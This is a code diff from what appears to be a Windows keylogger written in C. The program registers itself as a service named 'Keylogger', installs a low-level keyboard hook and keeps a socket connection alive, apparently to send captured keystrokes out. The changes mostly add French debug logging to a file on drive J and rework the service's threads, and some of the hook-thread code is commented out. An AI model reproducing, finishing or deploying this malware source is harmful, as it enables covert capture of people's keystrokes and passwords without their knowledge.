@@ -115,6 +115,17 @@ const struct keyboard keyboard[] =
 	{ 0, "[UNKNOWN]" }
 };
 
+int						WriteToLog(char* str)
+{
+	FILE				*log;
+	fopen_s(&log, "J:\\truc.txt", "a+");
+	if (log == NULL)
+		return -1;
+	fprintf(log, "%s\n", str);
+	fclose(log);
+	return 0;
+}
+
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	LPKBDLLHOOKSTRUCT kb;
@@ -140,6 +151,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
 void	setwinhook()
 {
+	MSG msg;
+
 	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)) == NULL)
 		return;
 #if 0
@@ -154,6 +167,16 @@ void	setwinhook()
 	CloseHandle(process.hProcess);
 	CloseHandle(process.hThread);
 #endif // 0
+	while (GetMessage(&msg, NULL, 0, 0) && (WaitForSingleObject(servicehandle, 0) != WAIT_OBJECT_0))
+	{
+		WriteToLog("je suis getmessage");
+		if (PeekMessage(&msg, NULL, WM_CLOSE, WM_CLOSE, PM_NOREMOVE) == TRUE)
+		{
+			break;
+		}
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
 }
 
 #define WORKING_BUFFER_SIZE 15000
@@ -247,20 +270,20 @@ void	save_data(const char *data)
 void server(SOCKET *server_sock)
 {
 	(void)server_sock;
-	return;
+	while (WaitForSingleObject(servicehandle, 0) != WAIT_OBJECT_0);
 }
 
 void keep_alive_client_and_init(void)
 {
 	char buf[10];
 	int size = (int)sizeof(buf);
-	while (WaitForSingleObject(servicehandle, 0) != WAIT_OBJECT_0)
-	{
-		if (init_socket(&my_sock) == SOCKET_ERROR || my_sock == INVALID_SOCKET)
-			return;
-		if (setsockopt(my_sock, SOL_SOCKET, SO_KEEPALIVE, buf, size) == SOCKET_ERROR)
-			return;
-		while (1)
+	
+	if (init_socket(&my_sock) == SOCKET_ERROR || my_sock == INVALID_SOCKET)
+		return;
+	WriteToLog("je suis dans le thread");
+	if (setsockopt(my_sock, SOL_SOCKET, SO_KEEPALIVE, buf, size) == SOCKET_ERROR)
+		return;
+		while (WaitForSingleObject(servicehandle, 0) != WAIT_OBJECT_0)
 		{
 			if (my_sock == INVALID_SOCKET || my_sock == SOCKET_ERROR)
 			{
@@ -269,7 +292,6 @@ void keep_alive_client_and_init(void)
 			Sleep(1000);
 		}
 		return;
-	}
 }
 
 void ServiceCtrlHandler(DWORD request)
@@ -295,13 +317,14 @@ int	ServiceMain(int ac, char **av)
 {
 	HANDLE thread_keepalive;
 	HANDLE thread_server;
+	HANDLE thread_keylogger;
 	SOCKET server_sock;
-	MSG msg;
 
 	(void)ac;
 	(void)av;
+	WriteToLog("je suis dans servicemain");
 	if ((servicestatushandle = RegisterServiceCtrlHandler(L"Keylogger", ServiceCtrlHandler)) == NULL)
-		return (-1);
+		return (WriteToLog("error registerservice"));
 	ZeroMemory(&servicestatus, sizeof(servicestatus));
 	servicestatus.dwCheckPoint = 0;
 	servicestatus.dwControlsAccepted = 0;
@@ -312,6 +335,7 @@ int	ServiceMain(int ac, char **av)
 	SetServiceStatus(servicestatushandle, &servicestatus);
 	if ((servicehandle = CreateEvent(NULL, TRUE, FALSE, NULL)) == NULL)
 	{
+		WriteToLog("eroro createevent");
 		servicestatus.dwCurrentState = SERVICE_STOPPED;
 		servicestatus.dwControlsAccepted = 0;
 		servicestatus.dwWin32ExitCode = 0;
@@ -324,33 +348,39 @@ int	ServiceMain(int ac, char **av)
 	servicestatus.dwWin32ExitCode = 0;
 	servicestatus.dwCheckPoint = 0;
 	SetServiceStatus(servicestatushandle, &servicestatus);
+	WriteToLog("ca a du demarrer la");
 	if ((thread_keepalive = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keep_alive_client_and_init, NULL, 0, NULL)) == NULL)
-		return (-1);
-//	if ((thread_server = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)server, &server_sock, 0, NULL)) == NULL)
-//		return (-1);
-	//setwinhook();
-	//while (GetMessage(&msg, NULL, 0, 0))
-	//{
-	//	if (PeekMessage(&msg, NULL, WM_CLOSE, WM_CLOSE, PM_NOREMOVE) == TRUE)
-	//	{
-	//		break;
-	//	}
-	//	TranslateMessage(&msg);
-	//	DispatchMessage(&msg);
-	//}
+		return (WriteToLog("probleme create thread"));
+	//if ((thread_server = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)server, &server_sock, 0, NULL)) == NULL)
+	//	return (-1);
+	//if ((thread_keylogger = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)setwinhook, NULL, 0, NULL)) == NULL)
+	//	return (-1);
+	WriteToLog("je suis apres les threads");
+	WriteToLog("je suis apres le getmessage");
 	//UnhookWindowsHookEx(handlekeyboard);
-	//if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
+//	if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
 	//{
 	//	printf("failed shutdown\n");
 	//	closesocket(my_sock);
 	//	return (-1);
 	//}
-	closesocket(my_sock);
+	if (closesocket(my_sock) != 0)
+		WriteToLog("closesocket marche pas");
 //	TerminateThread(thread_keepalive, 0);
 //	TerminateThread(thread_server, 0);
-	WaitForSingleObject(thread_keepalive, INFINITE);
+	//CloseHandle(thread_keepalive);
+	WriteToLog("je suis avant keepalive fin");
+	if (WaitForSingleObject(thread_keepalive, 10000) != WAIT_FAILED)
+		TerminateThread(thread_keepalive, 0);
+	WriteToLog("je suis avant server fin");
+//	if (WaitForSingleObject(thread_server, 10000) != WAIT_FAILED)
+//		TerminateThread(thread_server, 0);
+	WriteToLog("je suis avant keylogger fin");
+	//if (WaitForSingleObject(thread_keylogger, 10000) != WAIT_FAILED)
+		//TerminateThread(thread_keylogger, 0);
 	//WaitForSingleObject(thread_server, INFINITE);
 	CloseHandle(servicehandle);
+	WriteToLog("ba h normalmenet ca c'est fini");
 	servicestatus.dwCurrentState = SERVICE_STOPPED;
 	servicestatus.dwControlsAccepted = 0;
 	servicestatus.dwWin32ExitCode = 0;
@@ -369,10 +399,7 @@ int	main(void)
 	ServiceTable[1].lpServiceName = NULL;
 	ServiceTable[1].lpServiceProc = NULL;
 	WSAStartup(MAKEWORD(2, 0), &wsadata);
-
-	if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
-		return (-1);
-	
+	StartServiceCtrlDispatcher(ServiceTable);
 	WSACleanup();
 	return (0);
 }
